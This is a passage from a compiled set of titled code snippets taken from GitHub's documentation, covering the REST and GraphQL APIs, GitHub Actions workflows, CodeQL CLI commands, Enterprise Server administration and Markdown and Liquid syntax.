\"\"\"\n    Returns the first _n_ elements from the list.\n    \"\"\"\n    first: Int\n\n    \"\"\"\n    Returns the last _n_ elements from the list.\n    \"\"\"\n    last: Int\n\n    \"\"\"\n    Ordering options for discussions returned from the connection.\n    \"\"\"\n    orderBy: DiscussionOrder = {field: CREATED_AT, direction: DESC}\n\n    \"\"\"\n    Filter discussions to only those in a specific repository.\n    \"\"\"\n    repositoryId: ID\n  ): DiscussionConnection!\n}\n\n```\n\n----------------------------------------\n\nTITLE: Defining Deep Inheritance Hierarchy in C#\nDESCRIPTION: This C# code defines a deep inheritance hierarchy with classes like `Employee`, `Manager`, `SeniorManager`, `Director`, `VicePresident`, and `President`. Each class inherits from the previous one, creating a long chain of inheritance, which can be difficult to maintain and extend.  The goal is to refactor this structure to reduce the depth of inheritance.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/simplifying-complex-inheritance-hierarchies.md#_snippet_0\n\nLANGUAGE: csharp\nCODE:\n```\npublic class Employee\n{\n    public string Name { get; set; }\n    public int EmployeeID { get; set; }\n}\n\npublic class Manager : Employee\n{\n    public int NumberOfTeams { get; set; }\n}\n\npublic class SeniorManager : Manager\n{\n    public string Region { get; set; }\n}\n\npublic class Director : SeniorManager\n{\n    public int NumberOfDepartments { get; set; }\n}\n\npublic class VicePresident : Director\n{\n    public string Division { get; set; }\n}\n\npublic class President : VicePresident\n{\n    public string Company { get; set; }\n}\n```\n\n----------------------------------------\n\nTITLE: Orphaned Assets Check Workflow\nDESCRIPTION: This snippet specifies the location of the YAML file defining a workflow that checks for orphaned assets, i.e., images, and removes them when they are no longer used in any translation, ensuring the asset store remains consistent and relevant.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\n.github/workflows/orphaned-assets-check.yml\n```\n\n----------------------------------------\n\nTITLE: Dry-run with config file\nDESCRIPTION: This command performs a dry run migration of a Bamboo build using a specified config file path. The `--config-file-path` argument specifies the path to the Bamboo configuration file. The `--plan-slug` parameter specifies the Bamboo plan's project and plan key. The `-o` is a shorthand for `--output-dir` to specify output directory for converted workflow files.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_15\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer dry-run bamboo build --plan-slug IN-COM -o tmp/bamboo --config-file-path \"./path/to/my/bamboo/config.yml\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Products by Category with Pagination - TypeScript\nDESCRIPTION: This TypeScript function retrieves products belonging to a specific category from a database, with pagination support and includes the 5 most recent reviews for each product. It uses Prisma ORM for database interaction. The function takes `categoryId`, `page`, and `pageSize` as parameters and returns a Promise resolving to an array of Product objects. It can throw a `PrismaClientKnownRequestError` if the database query fails.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/documenting-code/syncing-documentation-with-code-changes.md#_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\n/**\n * Retrieves all products belonging to a specific category.\n *\n * @param categoryId - The unique identifier of the product category\n * @returns Promise that resolves to an array of Product objects\n *\n * @example\n * const products = await getByCategoryName(5);\n * // Returns: [{id: 1, name: \"Product 1\", categoryId: 5}, ...]\n *\n * @throws {PrismaClientKnownRequestError} If database query fails\n * @see {@link https://www.prisma.io/docs/reference/api-reference/prisma-client-reference#findmany}\n */\nasync getByCategoryName(categoryId: number, page = 1, pageSize = 10): Promise<Products[]> {\n  return await prisma.products.findMany({\n    where: { categoryId },\n    skip: (page - 1) * pageSize,\n    take: pageSize,\n    include: {\n      reviews: {\n        orderBy: { date: 'desc' },\n        take: 5,\n      },\n    },\n  });\n}\n```\n\n----------------------------------------\n\nTITLE: Requesting Installation Access Token with curl\nDESCRIPTION: This snippet demonstrates how to request an installation access token from the GitHub REST API using `curl`. It includes the necessary headers for specifying the API version, authentication (using a JWT), and content type. Replace `INSTALLATION_ID` with the actual installation ID and `JWT` with the generated JSON Web Token.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/apps/generate-installation-access-token.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n--url \"{% data variables.product.rest_url %}/app/installations/INSTALLATION_ID/access_tokens\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"Authorization: Bearer JWT\" \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: Configuring Git Attributes for File Finder Inclusion\nDESCRIPTION: This snippet demonstrates how to configure a `.gitattributes` file to include a directory, `build/`, in file finder search results by setting the `linguist-generated` attribute to `false`. It requires understanding of Git attributes and the use of recursive glob patterns.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/searching-on-github/finding-files-on-github.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nbuild/** linguist-generated=false\n```\n\n----------------------------------------\n\nTITLE: Running Production Docker Image\nDESCRIPTION: This command runs the locally built Docker image, mapping port 4000 on the host machine to port 4000 in the container. This allows accessing the application running inside the container through a web browser or other tools on the host machine.\nSOURCE: https://github.com/github/docs/blob/main/src/deployments/production/README.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ndocker run -p 4000:4000 docs:latest\n```\n\n----------------------------------------\n\nTITLE: Targeting specific branches in GitHub Actions YAML\nDESCRIPTION: This snippet demonstrates how to configure GitHub Actions to run only on specific branches. The `on` keyword is used with `push` and `branches` to define the target branches.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push:\n    branches:\n      - main\n      - 'mona/octocat'\n```\n\n----------------------------------------\n\nTITLE: Installing an Upgrade Package (Shell)\nDESCRIPTION: Installs an upgrade package using the `ghe-upgrade` utility. Replace `UPGRADE-PACKAGE-FILENAME` with the name of the upgrade package file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_103\n\nLANGUAGE: shell\nCODE:\n```\nghe-upgrade UPGRADE-PACKAGE-FILENAME\n```\n\n----------------------------------------\n\nTITLE: Handling issues.opened Webhook Event\nDESCRIPTION: This code shows how to handle an `issues.opened` webhook event using the Octokit.js SDK. It creates a comment on the opened issue using the `octokit.request` method. The snippet extracts relevant information from the webhook payload, such as the repository owner, repository name, and issue number. The `x-github-api-version` is also specified in the headers.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app-installation.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\napp.webhooks.on(\"issues.opened\", ({ octokit, payload }) => {\n  await octokit.request(\"POST /repos/{owner}/{repo}/issues/{issue_number}/comments\", {\n      owner: payload.repository.owner.login,\n      repo: payload.repository.name,\n      issue_number: payload.issue.number,\n      body: `This is a bot post in response to this issue being opened.`, \n      headers: {\n        \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n      },\n    }\n  )\n});\n```\n\n----------------------------------------\n\nTITLE: Defining Discussion Category Form Body in YAML\nDESCRIPTION: This code snippet demonstrates the basic structure for defining the body of a discussion category form using YAML. It includes an input field with attributes for label, description, and placeholder, as well as validations.\nSOURCE: https://github.com/github/docs/blob/main/content/discussions/managing-discussions-for-your-community/syntax-for-discussion-category-forms.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: input\n  id: suggestion\n  attributes:\n    label: Suggestion\n    description: \"How might we make this project better?\"\n    placeholder: \"Adding a CODE_OF_CONDUCT.md file would be a great idea.\"\n  validations:\n    required: true\n```\n\n----------------------------------------\n\nTITLE: Configuring Rack Environment\nDESCRIPTION: This Ruby snippet configures the Rack environment for the Sinatra application.  It sets the `RACK_ENV` environment variable to 'development' if it's not already set, requires necessary gems using Bundler, and then runs the Sinatra application defined in the `server.rb` file.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nENV['RACK_ENV'] ||= 'development'\nrequire \"rubygems\"\nrequire \"bundler/setup\"\n\nrequire File.expand_path(File.join(File.dirname(__FILE__), 'server'))\n\nrun Example::MyGraphApp\n```\n\n----------------------------------------\n\nTITLE: Displaying Alternative Suggestions using GitHub Copilot in C#\nDESCRIPTION: This code snippet shows how GitHub Copilot suggests code for a given C# function signature. This functionality is triggered when the user types the function signature and Copilot to offer a suggestion. This snippet highlights how to view and select alternative suggestions provided by GitHub Copilot.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_5\n\nLANGUAGE: C#\nCODE:\n```\nint CalculateDaysBetweenDates(\n```\n\n----------------------------------------\n\nTITLE: Tool Tag: Importer CLI\nDESCRIPTION: This code snippet demonstrates how to use the `importer_cli` tag to display content relevant to GitHub Enterprise Importer CLI users. It wraps instructions specific to using the importer CLI.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/using-markdown-and-liquid-in-github-docs.md#_snippet_15\n\nLANGUAGE: text\nCODE:\n```\n{% raw %}{% importer_cli %}\n\nThese instructions are pertinent to GitHub Enterprise Importer CLI users.\n\n{% endimporter_cli %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Basic Code Search Term\nDESCRIPTION: This snippet demonstrates a basic code search term without any qualifiers. It will match files containing the term or files with the term in their path.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_0\n\nLANGUAGE: text\nCODE:\n```\nhttp-push\n```\n\n----------------------------------------\n\nTITLE: Deleting Repository via REST API\nDESCRIPTION: This command sends a `DELETE` request to the GitHub REST API endpoint to delete a repository after migration and unlocking. It requires a GitHub access token for authentication, the organization name, and the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_12\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer GITHUB_ACCESS_TOKEN\" -X DELETE \\\n  https://api.github.com/repos/ORG-NAME/REPO_NAME\n```\n\n----------------------------------------\n\nTITLE: Clone Translation Repos Locally\nDESCRIPTION: These shell commands demonstrate how to clone the private translation repositories into the `translations/[lang-code]` directories within the local `docs-internal` project.  This allows for local testing and development of translated content.\nSOURCE: https://github.com/github/docs/blob/main/src/languages/README.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\ncd docs-internal\nmkdir translations && cd translations\n\ngit clone <es-es-repo-url> es-es\ngit clone <ja-jp-repo-url> ja-jp\ngit clone <pt-br-repo-url> pt-br\ngit clone <zh-cn-repo-url> zh-cn\ngit clone <ru-ru-repo-url> ru-ru\ngit clone <fr-fr-repo-url> fr-fr\ngit clone <ko-kr-repo-url> ko-kr\ngit clone <de-de-repo-url> de-de\n```\n\n----------------------------------------\n\nTITLE: Backing up Firewall Rules UFW\nDESCRIPTION: This snippet provides a command to back up the current UFW firewall rules.  It uses the `sudo cp` command to recursively copy the `/etc/ufw` directory (containing the firewall rules) to a backup directory named `~/ufw.backup` in the user's home directory. This is crucial before making any modifications to the firewall, allowing for easy restoration if needed.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/configuring-network-settings/configuring-built-in-firewall-rules.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nsudo cp -r /etc/ufw ~/ufw.backup\n```\n\n----------------------------------------\n\nTITLE: Asking example questions to GitHub Copilot Chat\nDESCRIPTION: This section presents various example questions that can be asked to GitHub Copilot Chat. These examples demonstrate the type of general software-related questions that can be answered by the AI. They rely on the AI's knowledge base and any integrated web search capabilities.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/copilot-chat/asking-github-copilot-questions-in-github.md#_snippet_3\n\nLANGUAGE: plaintext\nCODE:\n```\nWhat are the advantages of the Go programming language?\n```\n\nLANGUAGE: plaintext\nCODE:\n```\nWhat is Agile software development?\n```\n\nLANGUAGE: plaintext\nCODE:\n```\nWhat is the most popular JavaScript framework?\n```\n\nLANGUAGE: plaintext\nCODE:\n```\nGive me some examples of regular expressions.\n```\n\nLANGUAGE: plaintext\nCODE:\n```\nWrite a bash script to output today's date.\n```\n\n----------------------------------------\n\nTITLE: Getting Artifact Attestation Trust Domain\nDESCRIPTION: This command retrieves the artifact attestation trust domain for a GitHub Enterprise Cloud account with data residency using the `gh api meta` command.  The `--jq` flag is used to extract the `trust_domain` from the JSON response.  This domain is required to properly configure the `trust-policies` chart.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller.md#_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ngh api meta --jq .domains.artifact_attestations.trust_domain\n```\n\n----------------------------------------\n\nTITLE: Example Loopback Redirect URI\nDESCRIPTION: Example demonstrating a loopback redirect URI, useful for native applications listening on a specific port.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authorizing-oauth-apps.md#_snippet_13\n\nLANGUAGE: http\nCODE:\n```\nhttp://127.0.0.1:1234/path\n```\n\n----------------------------------------\n\nTITLE: Querying Service Principals via Microsoft Graph API\nDESCRIPTION: This snippet demonstrates how to use the Microsoft Graph API to retrieve the object ID (`id`) of a service principal based on its application ID (`appId`). The query filters service principals by the application ID and selects the `id`, `appId`, and `appDisplayName` properties for the response. This is useful for programmatically identifying the service principal associated with a specific Entra OIDC application.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/configuring-authentication-for-enterprise-managed-users/finding-the-object-id-for-your-entra-oidc-application.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"@odata.context\": \"https://graph.microsoft.com/v1.0/$metadata#servicePrincipals(id,appId,appDisplayName)\",\n    \"value\": [\n        {\n            \"id\": \"c8162c97-32ff-406d-85d3-cc372e3e8384\",\n            \"appId\": \"12f6db80-0741-4a7e-b9c5-b85d737b3a31\",\n            \"appDisplayName\": \"GitHub Enterprise Managed User (OIDC)\"\n        }\n    ]\n   }\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Username and Password using curl\nDESCRIPTION: This shell script demonstrates how to authenticate API requests using a username and password with `curl`. This method is only supported in GitHub Enterprise Server (GHES). Replace `USERNAME` and `PASSWORD` with the appropriate credentials. It sends a GET request to `/user` endpoint, including the username and password within the request using the `--user` option, and sets the API version header.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/authentication/authenticating-to-the-rest-api.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request GET \\\n--url \"{% data variables.product.rest_url %}/user\" \\\n--user USERNAME:PASSWORD \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\"\n```\n\n----------------------------------------\n\nTITLE: Packaging Gradle build artifacts\nDESCRIPTION: This snippet demonstrates how to upload build artifacts after a successful Gradle build. It checks out the code, sets up Java and Gradle, builds the project, and then uploads the contents of the `build/libs` directory as an artifact named \"Package\". This enables storing and downloading the built Java packages.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-java-with-gradle.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n  - uses: {% data reusables.actions.action-checkout %}\n  - uses: {% data reusables.actions.action-setup-java %}\n    with:\n      java-version: '17'\n      distribution: 'temurin'\n\n  - name: Setup Gradle\n    uses: gradle/actions/setup-gradle@af1da67850ed9a4cedd57bfd976089dd991e2582 # v4.0.0\n\n  - name: Build with Gradle\n    run: ./gradlew build\n\n  - name: Upload build artifacts\n    uses: {% data reusables.actions.action-upload-artifact %}\n    with:\n      name: Package\n      path: build/libs\n```\n\n----------------------------------------\n\nTITLE: Clean Untracked Git Files\nDESCRIPTION: This command interactively removes untracked files from the working tree of the Git repository within the GitHub Codespaces environment. It helps clean up unwanted files and reduces clutter.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-creation-and-deletion-of-codespaces.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngit clean -i\n```\n\n----------------------------------------\n\nTITLE: Example GraphQL Query for Rate Limit Calculation\nDESCRIPTION: This GraphQL query fetches viewer login, repositories, issues, and labels to demonstrate rate limit calculation. The query retrieves 100 repositories, 50 issues per repository, and 60 labels per issue.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/overview/rate-limits-and-node-limits-for-the-graphql-api.md#_snippet_2\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  viewer {\n    login\n    repositories(first: 100) {\n      edges {\n        node {\n          id\n\n          issues(first: 50) {\n            edges {\n              node {\n                id\n\n                labels(first: 60) {\n                  edges {\n                    node {\n                      id\n                      name\n                    }\n                  }\n                }\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: View logs in systemd journal using journalctl\nDESCRIPTION: This command uses the `journalctl` utility to display logs for a specified service within the systemd journal. Replace `SERVICE-NAME` with the name of the service you want to inspect.  You can find the list of possible `SERVICE-NAME` values within the document.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/monitoring-your-instance/about-system-logs.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\njournalctl -t SERVICE-NAME\n```\n\n----------------------------------------\n\nTITLE: Unset Git commit.gpgsign setting (shell)\nDESCRIPTION: This command resets the `commit.gpgsign` Git configuration value to the default of `false`, effectively disabling GPG signing for commits. This is useful after disabling GPG verification in GitHub Codespaces settings, to prevent Git from attempting to sign commits without the necessary credentials.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-gpg-verification-for-github-codespaces.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit config --unset commit.gpgsign\n```\n\n----------------------------------------\n\nTITLE: Opening Cluster Config File with Vim\nDESCRIPTION: This command opens the cluster configuration file located at `/data/user/common/cluster.conf` using the Vim text editor.  It requires root privileges, hence the use of `sudo`. Before executing, ensure Vim is installed on the system.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_clustering/open-configuration-file.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nsudo vim /data/user/common/cluster.conf\n```\n\n----------------------------------------\n\nTITLE: Adding Footnotes in Markdown\nDESCRIPTION: This snippet demonstrates how to add footnotes to Markdown content using the bracket syntax. It includes an example of a simple footnote and a footnote with multiple lines, along with instructions on how to add line breaks within a footnote.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_14\n\nLANGUAGE: text\nCODE:\n```\nHere is a simple footnote[^1].\n\nA footnote can also have multiple lines[^2].\n\n[^1]: My reference.\n[^2]: To add line breaks within a footnote, prefix new lines with 2 spaces.\n  This is a second line.\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting Could Not Read From Remote - Shell\nDESCRIPTION: This snippet presents the error message encountered when a valid SSH key is not set up, leading to a failure in reading from the remote repository. The solution involves setting up the correct SSH key.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/installing-and-authenticating-to-github-desktop/authenticating-to-github-in-github-desktop.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngit@github.com: Permission denied (publickey).\nfatal: Could not read from remote repository.\n\nPlease make sure you have the correct access rights and the repository exists.\n```\n\n----------------------------------------\n\nTITLE: Testing GitHub Copilot Connection via HTTP Proxy with curl\nDESCRIPTION: This command uses `curl` to check if the user can access GitHub Copilot's endpoint through a specified HTTP proxy. Replace `YOUR-PROXY-URL:PORT` with the actual proxy details.  The `-x` flag specifies the proxy URL, `-i` includes HTTP headers in the output, and `-L` follows redirects.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/troubleshooting-github-copilot/troubleshooting-network-errors-for-github-copilot.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncurl --verbose -x http://YOUR-PROXY-URL:PORT -i -L https://copilot-proxy.githubusercontent.com/_ping\n```\n\n----------------------------------------\n\nTITLE: Generate Log Summary Command\nDESCRIPTION: This command generates a summary of a structured JSON evaluator event log. It takes an input log file and an output path as mandatory arguments, and provides options to minify output, use UTC timestamps, and format the output in different ways.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/generate-log-summary.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql generate log-summary <options>... -- <input> <result>\n```\n\n----------------------------------------\n\nTITLE: Initializing a CodeQL pack\nDESCRIPTION: This command initializes a CodeQL pack with a specified scope and pack name. It creates the directory structure and configuration files required for a CodeQL pack. Replace `<scope>` with the GitHub organization or user account name and `<pack>` with the desired pack name.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-and-working-with-codeql-packs.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack init <scope>/<pack>\n```\n\n----------------------------------------\n\nTITLE: SAML Metadata XML Example\nDESCRIPTION: This XML defines the SAML metadata for a {% data variables.enterprise.data_residency_site %} instance. It specifies the entity ID, protocol support, name ID format, and assertion consumer service endpoint.  SUBDOMAIN needs to be replaced with the actual subdomain.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/configuring-authentication-and-provisioning-with-pingfederate.md#_snippet_4\n\nLANGUAGE: XML\nCODE:\n```\n<?xml version=\"1.0\"?>\n<md:EntityDescriptor xmlns:md=\"urn:oasis:names:tc:SAML:2.0:metadata\"\n  entityID=\"https://SUBDOMAIN.ghe.com/enterprises/SUBDOMAIN\" cacheDuration=\"PT1440M\">\n  <md:SPSSODescriptor protocolSupportEnumeration=\"urn:oasis:names:tc:SAML:2.0:protocol\"\n    AuthnRequestsSigned=\"false\" WantAssertionsSigned=\"false\">\n    <md:NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</md:NameIDFormat>\n    <md:AssertionConsumerService Binding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\"\n      Location=\"https://SUBDOMAIN.ghe.com/enterprises/SUBDOMAIN/saml/consume\" isDefault=\"true\"\n      index=\"0\"/>\n  </md:SPSSODescriptor>\n</md:EntityDescriptor>\n```\n\n----------------------------------------\n\nTITLE: Handling Intended Error Codes (404)\nDESCRIPTION: This code snippet demonstrates how to handle a specific error code (404 Not Found) as a non-error response. It checks if a repository is starred by the authenticated user. A 404 error indicates the repository is not starred, which is handled as expected behavior, while other errors are treated as unexpected errors.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\ntry {\n  await octokit.request(\"GET /user/starred/{owner}/{repo}\", {\n    owner: \"github\",\n    repo: \"docs\",\n    headers: {\n      \"x-github-api-version\": \"{{ allVersions[currentVersion].latestApiVersion }}\",\n    },\n  });\n\n  console.log(`The repository is starred by me`);\n\n} catch (error) {\n  if (error.status === 404) {\n    console.log(`The repository is not starred by me`);\n  } else {\n    console.error(`An error occurred while checking if the repository is starred: ${error?.response?.data?.message}`);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub Check Run (Ruby)\nDESCRIPTION: This helper method creates a new check run on GitHub with the status set to 'queued'. It requires the repository's full name, a name for the check run ('Octo RuboCop'), and the SHA of the commit to check. It uses the Octokit client authenticated as an installation of a GitHub App.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_47\n\nLANGUAGE: Ruby\nCODE:\n```\n    # Create a new check run with status \"queued\"\n    def create_check_run\n      @installation_client.create_check_run(\n        # [String, Integer, Hash, Octokit Repository object] A GitHub repository.\n        @payload['repository']['full_name'],\n        # [String] The name of your check run.\n        'Octo RuboCop',\n        # [String] The SHA of the commit to check\n        # The payload structure differs depending on whether a check run or a check suite event occurred.\n        @payload['check_run'].nil? ? @payload['check_suite']['head_sha'] : @payload['check_run']['head_sha'],\n        # [Hash] 'Accept' header option, to avoid a warning about the API not being ready for production use.\n        accept: 'application/vnd.github+json'\n      )\n    end\n```\n\n----------------------------------------\n\nTITLE: Generating GitHub App Token in Workflow\nDESCRIPTION: This YAML snippet demonstrates how to generate a GitHub App installation access token within a GitHub Actions workflow. It uses the `actions/create-github-app-token` action with the app's ID and private key (stored as secrets/vars) to create the token. The token is then used to authenticate API calls.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  use_api:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Generate token\n        id: generate-token\n        uses: actions/create-github-app-token@v1\n        with:\n          app-id: {% raw %}${{ vars.APP_ID }}{% endraw %}\n          private-key: {% raw %}${{ secrets.APP_PEM }}{% endraw %}\n\n      - name: Use API\n        env:\n          GH_TOKEN: {% raw %}${{ steps.generate-token.outputs.token }}{% endraw %}\n        run: |\n          curl --request GET \\\n          --url \"{% data variables.product.rest_url %}{% data variables.rest.example_request_url %}\" \\\n          --header \"Accept: application/vnd.github+json\" \\\n          --header \"Authorization: Bearer $GH_TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Defining Feature Versions in YAML\nDESCRIPTION: This YAML snippet defines feature versions for 'meow' across different GitHub product versions: fpt, ghec, and ghes. The '*' indicates that the feature is available in all versions of fpt and ghec, while '>3.1' specifies that it's available in ghes versions greater than 3.1.\nSOURCE: https://github.com/github/docs/blob/main/data/features/README.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  ghec: '*'\n  ghes: '>3.1'\n```\n\n----------------------------------------\n\nTITLE: Using the Tip Liquid Tag\nDESCRIPTION: This snippet demonstrates how to use the `tip` Liquid tag in a Markdown file. The content within the `{% tip %}` and `{% endtip %}` tags will be rendered as a tip box in the output.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/tips.md#_snippet_0\n\nLANGUAGE: liquid\nCODE:\n```\n{% tip %}\n\n**Tip!** This is inside the tip.\n\n{% endtip %}\n```\n\n----------------------------------------\n\nTITLE: Running CodeQL Query Pack Analysis\nDESCRIPTION: This example demonstrates how to run an existing CodeQL query pack from the GitHub Container Registry. It specifies one or more pack names and the `--download` flag to ensure the pack is available locally. Requires a CodeQL database `<database>` and downloads the query pack if not already present.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/analyzing-your-code-with-codeql-queries.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql database analyze <database> microsoft/coding-standards@1.0.0 github/security-queries --format=sarifv2.1.0 --output=query-results.sarif --download\n```\n\n----------------------------------------\n\nTITLE: Using 'always()' to bypass dependency success - YAML\nDESCRIPTION: This YAML snippet demonstrates how to use the `always()` conditional expression in the `if` statement to ensure that a job runs even if its dependencies fail. `job3` will always run after `job1` and `job2` complete, regardless of their success status. This is useful when you need a job to run for cleanup or reporting purposes even if previous steps have failed.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-jobs-in-a-workflow-needs.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  job1:\n  job2:\n    needs: job1\n  job3:\n    if: {% raw %}${{ always() }}{% endraw %}\n    needs: [job1, job2]\n```\n\n----------------------------------------\n\nTITLE: Audit Bamboo instance using a config file\nDESCRIPTION: This command audits a Bamboo instance using a configuration file. The `--config-file-path` argument specifies the path to the YAML configuration file. The `-o` is a shorthand for `--output-dir` to specify output directory for audit result.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer audit bamboo -o tmp/bamboo --config-file-path \"./path/to/my/bamboo/config.yml\"\n```\n\n----------------------------------------\n\nTITLE: Generating a Private Key with OpenSSL\nDESCRIPTION: This command generates a 2048-bit RSA private key and a certificate signing request (CSR) using OpenSSL. The CSR is used to request a certificate from a certificate authority. The private key will be saved to MyPrivateKey.key and the CSR to MyCertificateRequest.csr.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/configuring-authentication-and-provisioning-with-pingfederate.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nopenssl req -nodes -sha256 -newkey rsa:2048 -keyout MyPrivateKey.key -out MyCertificateRequest.csr\n```\n\n----------------------------------------\n\nTITLE: Preparing Archive for Import - Shell\nDESCRIPTION: This command prepares the migration archive for import on the target instance using the `ghe-migrator prepare` command. It requires the path to the migration archive and generates a new Migration GUID for subsequent steps. Running the command again will start a new import attempt.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator prepare /home/admin/MIGRATION-GUID.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Dry Run Travis CI with Config File\nDESCRIPTION: This command performs a dry run of the Travis CI migration using a specified YAML configuration file as the source. It requires the Travis CI repository name, output directory, and the path to the configuration file.\nSOURCE: 